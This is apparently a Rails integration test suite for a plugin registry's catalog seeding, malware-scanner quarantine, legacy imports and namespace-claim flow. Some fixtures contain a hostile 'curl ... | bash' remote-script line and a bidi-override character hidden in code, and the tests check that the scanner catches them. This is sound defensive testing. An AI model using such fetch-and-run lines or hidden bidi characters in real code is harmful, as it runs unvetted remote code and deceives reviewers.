require "test_helper"

class SeedingAndClaimTest < ActionDispatch::IntegrationTest
  CATALOG = [
    { "publisher" => "gracehopper", "name" => "weather", "summary" => "Weather widget",
      "repository" => "https://github.com/gracehopper/weather" }
  ].freeze

  def seed!(tarball: TarballBuilder.build(manifest: TarballBuilder.manifest(id: "gracehopper.weather")))
    results = nil
    perform_enqueued_jobs do
      results = Registry::SeedCatalog.import(CATALOG, snapshotter: ->(_repo) { tarball })
    end
    results
  end

  test "seeds an unclaimed publisher whose plugin runs the pipeline and publishes" do
    results = seed!
    assert_equal "submitted", results.first[:status]

    publisher = Publisher.find_by!(name: "gracehopper")
    assert_not publisher.claimed?
    plugin = publisher.plugins.find_by!(name: "weather")
    assert plugin.versions.first.published?
    assert AuditEvent.exists?(action: "plugin.seed")
  end

  test "seeded plugins that fail review are hidden from the public until cleared" do
    results = seed!(tarball: TarballBuilder.build(
      manifest: TarballBuilder.manifest(id: "gracehopper.weather"),
      files: { "Widget.qml" => "import QtQuick\nItem {}\n",
               "install.sh" => "#!/bin/bash\ncurl -s https://x.example/i.sh | bash\n" }))
    assert_equal "submitted", results.first[:status]
    version = Publisher.find_by!(name: "gracehopper").plugins.first.versions.first
    assert version.quarantined?

    get plugin_path("gracehopper", "weather")
    assert_response :not_found

    get root_path
    assert_select ".index-picker__row", text: /weather/, count: 0
    assert_select "a[href='/plugins/gracehopper/weather']", 0
  end

  test "seeding is idempotent" do
    seed!
    results = seed!
    assert_equal "skipped", results.first[:status]
  end

  LEGACY_COMMIT = "a" * 40
  LEGACY_ENTRY = [
    { "publisher" => "adalovelace", "name" => "omarchy-clock", "summary" => "A clock",
      "repository" => "https://github.com/adalovelace/omarchy-clock",
      "commit" => LEGACY_COMMIT, "listed_at" => "2026-07-30T14:00:00Z",
      "category" => "widgets", "tags" => [ "clock", "not-a-real-tag" ] }
  ].freeze

  test "legacy marketplace entry seeds at the pinned commit with normalized manifest, grandfathered name, and backdated dates" do
    # GitHub archive shape: prefix directory, legacy-convention id, no license
    manifest = { "schemaVersion" => 1, "id" => "io.github.adalovelace.clock", "name" => "Clock",
                 "version" => "1.2.0", "kinds" => [ "bar-widget" ],
                 "entryPoints" => { "barWidget" => "Widget.qml" } }
    prefix = "omarchy-clock-#{LEGACY_COMMIT}"
    tarball = TarballBuilder.build(manifest: nil, files: {
      "#{prefix}/manifest.json" => manifest.to_json,
      "#{prefix}/Widget.qml" => "import QtQuick\nItem {}\n"
    })

    requested = nil
    results = nil
    perform_enqueued_jobs do
      results = Registry::SeedCatalog.import(LEGACY_ENTRY,
        snapshotter: ->(repo, commit = nil) { requested = [ repo, commit ]; tarball })
    end
    assert_equal "submitted", results.first[:status], results.first[:reason].to_s
    assert_equal [ "https://github.com/adalovelace/omarchy-clock", LEGACY_COMMIT ], requested

    plugin = Publisher.find_by!(name: "adalovelace").plugins.find_by!(name: "omarchy-clock")
    version = plugin.versions.first
    assert version.published?
    # Backdated to the original marketplace listing time
    assert_equal Time.zone.parse("2026-07-30T14:00:00Z"), version.published_at
    assert_equal Time.zone.parse("2026-07-30T14:00:00Z"), plugin.created_at
    # Manifest normalized: registry id, legacy id preserved, curation injected
    assert_equal "adalovelace.omarchy-clock", version.manifest["id"]
    assert_equal "io.github.adalovelace.clock", version.manifest["legacyId"]
    assert_equal "widgets", version.manifest["category"]
    assert_equal [ "clock" ], version.manifest["tags"]
    assert_nil version.license
    # Provenance carries the lineage for the plugin page and legacy map
    assert_equal "legacy-marketplace", version.provenance["source"]
    assert_equal LEGACY_COMMIT, version.provenance["sha"]
    assert_equal "io.github.adalovelace.clock", version.legacy_id
  end

  test "exact-commit legacy verification releases scanner FLAGS but never FAILS" do
    flaggy_files = { "Widget.qml" => "import QtQuick\nItem {}\n",
                     "setup.sh" => "#!/bin/bash\ncurl -s https://x.example/i.sh | bash\n" }
    entry = LEGACY_ENTRY.first.merge("verified" => true, "verification_method" => "maintainer-reviewed")
    tarball = TarballBuilder.build(manifest: TarballBuilder.manifest(id: "whatever.clock"), files: flaggy_files)

    results = nil
    perform_enqueued_jobs do
      results = Registry::SeedCatalog.import([ entry ], snapshotter: ->(_r, _c = nil) { tarball })
    end
    assert_equal "submitted", results.first[:status], results.first[:reason].to_s
    version = Publisher.find_by!(name: "adalovelace").plugins.find_by!(name: "omarchy-clock").versions.first
    assert version.published?, "evidence-backed flag should release (state: #{version.state} — #{version.review_notes})"
    assert_match(/legacy-marketplace evidence/, version.review_notes)
    assert_equal [ "curl-pipe-shell" ], version.scan_results["findings"].map { |f| f["rule"] }.uniq

    # A deterministic FAIL (bidi override in code) outranks imported evidence
    faily = TarballBuilder.build(manifest: TarballBuilder.manifest(id: "whatever.evil"),
      files: { "Widget.qml" => "import QtQuick\n// tot‮ally fine\nItem {}\n" })
    entry2 = entry.merge("name" => "omarchy-evil", "repository" => "https://github.com/adalovelace/omarchy-evil")
    perform_enqueued_jobs do
      results = Registry::SeedCatalog.import([ entry2 ], snapshotter: ->(_r, _c = nil) { faily })
    end
    version2 = Publisher.find_by!(name: "adalovelace").plugins.find_by!(name: "omarchy-evil").versions.first
    assert version2.rejected?
  end

  test "an interactive publish still cannot take a reserved omarchy-* name" do
    plugin = Publisher.create!(name: "someone", kind: :personal).plugins.new(name: "omarchy-thing")
    assert_not plugin.valid?
    assert_match(/reserved/, plugin.errors[:name].join)
  end

  test "publishing to an unclaimed namespace is forbidden until claimed" do
    seed!
    publisher = Publisher.find_by!(name: "gracehopper")
    user = User.create!(email_address: "grace@example.com", name: "Grace",
      otp_secret: ROTP::Base32.random, otp_enabled_at: Time.current)
    Membership.create!(publisher:, user:, role: :owner, founding: true)

    error = assert_raises(Registry::PublishVersion::PublishError) do
      Registry::PublishVersion.new(user:, publisher:, plugin_name: "weather",
        tarball_bytes: TarballBuilder.build(manifest: TarballBuilder.manifest(id: "gracehopper.weather", version: "1.1.0"))).call
    end
    assert_match(/unclaimed/, error.message)
  end

  test "repo-proof claim flow hands the namespace to the claimant" do
    seed!
    user = User.create!(email_address: "grace@example.com", name: "Grace")
    sign_in_as user

    get claim_path("gracehopper")
    assert_response :success
    publisher = Publisher.find_by!(name: "gracehopper")
    challenge = Registry::RepoProof.challenge_for(publisher, user)
    assert challenge.start_with?("omarchy-claim-")
    assert_match challenge, response.body
    assert_match "raw.githubusercontent.com/gracehopper/weather", response.body

    # Wrong token in the repo -> rejected
    Rails.application.config.x.repo_proof_fetcher = ->(_url) { "not-the-token" }
    post verify_claim_path("gracehopper")
    assert_redirected_to claim_path("gracehopper")
    assert_not publisher.reload.claimed?

    # The owner's committed token is useless to a different account
    attacker = User.create!(email_address: "mallory@example.com", name: "Mallory")
    Rails.application.config.x.repo_proof_fetcher = ->(_url) { "#{challenge}\n" }
    sign_in_as attacker
    post verify_claim_path("gracehopper")
    assert_redirected_to claim_path("gracehopper")
    assert_not publisher.reload.claimed?

    # Correct token + the matching account -> claimed, owner membership
    sign_in_as user
    post verify_claim_path("gracehopper")
    assert_redirected_to dashboard_path
    assert publisher.reload.claimed?
    assert user.owner_of?(publisher)
    assert_not attacker.owner_of?(publisher)
    assert AuditEvent.exists?(action: "publisher.claim_seeded", public: true)
  ensure
    Rails.application.config.x.repo_proof_fetcher = nil
  end

  test "claim page is not offered for claimed namespaces" do
    publisher = Publisher.create!(name: "taken", kind: :personal)
    user = User.create!(email_address: "x@example.com", name: "X")
    sign_in_as user
    get claim_path("taken")
    assert_redirected_to publisher_path("taken")
  end
end
